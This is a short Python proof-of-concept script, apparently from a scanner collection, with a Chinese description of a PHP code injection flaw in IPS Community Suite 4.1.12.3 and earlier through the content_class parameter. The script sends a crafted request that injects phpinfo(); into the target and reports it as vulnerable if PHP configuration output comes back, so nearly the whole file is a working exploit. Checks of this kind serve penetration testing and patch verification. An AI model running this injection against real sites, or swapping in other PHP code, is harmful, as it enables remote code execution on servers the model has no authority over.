#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: IPS Community Suite <= 4.1.12.3 PHP远程代码执行
referer: https://www.seebug.org/vuldb/ssvid-92096
author: Lucifer
description: IPS Community Suite "是一款国外比较常见的cms。
    但在其4.1.12.3版本及以下版本，存在PHP代码注入漏洞，该漏洞源于程序未能充分过滤content_class请求参数。
    远程攻击者可利用该漏洞注入并执行任意PHP代码。
    漏洞触发条件:
    IPS版本：<=4.1.12.3
    php环境：<=5.4.24和5.5.0-5.5.8
'''
import sys
import requests
import warnings
from termcolor import cprint

class ips_community_suite_code_exec_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/index.php?app=core&module=system&controller=content&do=find&content_class=cms\Fields1{}phpinfo();/*"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"Configuration File (php.ini) Path" in req.text:
                cprint("[+]存在IPS Community Suite <= 4.1.12.3 PHP远程代码执行漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = ips_community_suite_code_exec_BaseVerify(sys.argv[1])
    testVuln.run()